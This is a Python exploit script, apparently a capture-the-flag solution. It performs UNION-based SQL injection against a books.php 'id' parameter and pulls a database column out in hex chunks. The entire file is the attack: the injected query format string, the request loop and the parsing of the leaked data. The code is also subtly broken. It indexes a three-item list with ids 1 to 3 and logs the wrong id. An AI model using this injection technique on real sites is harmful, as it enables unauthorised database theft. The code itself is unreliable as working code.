#!/usr/bin/env python3
import requests as req
from urllib.parse import quote_plus
from pwn import log
from binascii import unhexlify

# the errors generated by the requests only show 80 characters from the result of the queries and stops printing when it encounters newlines, so we we use SUBSTRING() to print only a certain number of characters per request and encode the result in hex with HEX()

base_url = 'https://poems.asisctf.com/books.php?type=excerpt&id='
# to format the argument POS in SUBSTRING, and the id
info_query_format = "' UNION ALL SELECT CONCAT('|', HEX(SUBSTRING(info, {:d}, 39)), '|') FROM ASISCTF.books WHERE id={:d} #"

sess = req.Session()

contents = [b"" for _ in range(3)] # XML contents of each book (there are 3)
pos_jmp = 39 # number of positions to jump by for SUBSTRING
# for each id (1, 2 and 3)
for i in range(1, 4):
  pos = 1
  while True:
    url = base_url + quote_plus(info_query_format.format(pos, i))
    log.info('url: %s', url)
    r = sess.get(url=url)
    print(r.content)
    thehex = r.content.split(b'|')[1][:78] # we get the info in hex
    log.info('hex: %s', thehex.decode())
    if thehex == b'': # no more output => we break out
      break
    contents[i] += unhexlify(thehex) # unhex the info and add it to contents[i]
    log.info("id: %d; info:\n%s", i+1, contents[i].decode()) # log the contents
    pos += pos_jmp
